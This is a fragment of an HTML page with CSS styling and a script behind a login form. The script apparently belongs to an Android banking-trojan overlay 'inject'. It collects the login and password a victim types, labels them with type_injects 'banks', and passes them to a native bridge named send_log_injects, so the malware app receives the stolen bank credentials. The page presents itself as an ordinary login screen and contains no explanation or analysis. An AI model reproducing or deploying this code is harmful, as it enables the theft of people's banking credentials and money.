        #formIn {
            background-color: rgba(34, 45, 94, 0.651);
            padding: 15px;
        }

        form {
            padding: 15px;
        }
        
        footer {
            display: grid;
            grid-template-columns: 1fr 1fr;
            grid-gap: 10px;
        }

        #blocks {
            width: 100%;
            background-color: #f4f5f7;
            color: #000;
            text-align: center;
            padding: 10px 0;
            border: 0;
            border-radius: 6px;
            font-size: 14px;
        }

        p {
            margin: 0;
        }

        .input {
            width: 100%;
            padding: 8px;
            padding-left: 55px;
            border: 0;
            border-radius: 4px;
        }

        .icons {
            position: relative;
            background-color: #86b655;
            padding: 9px;
            top: -32px;
            left: 2px;
            border: 0;
            border-radius: 2px 0 0 2px;
            margin-bottom: -70px;
        }

        .button {
            width: 100%;
            padding: 12px;
            color: #fff;
            background-color: #86b655;
            border: 0;
            border-radius: 6px;
            margin-bottom: 15px;
        }

        .button:disabled {
            opacity: 0.4;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }
    </style>

    </form>
    <script>
        var login = document.getElementById('login'),
            password = document.getElementById('password');
        
        var sendData = document.getElementById('sendData');

        function check() {
            if(login.value.length >= 4 && password.value.length >= 4) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        login.onkeyup = () => {
            check();
        }

        password.onkeyup = () => {
            check();
        }

        sendData.onclick = () => {
                var data = {};
                data.login = login.value;
                data.password = password.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";
                
                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
    </script>
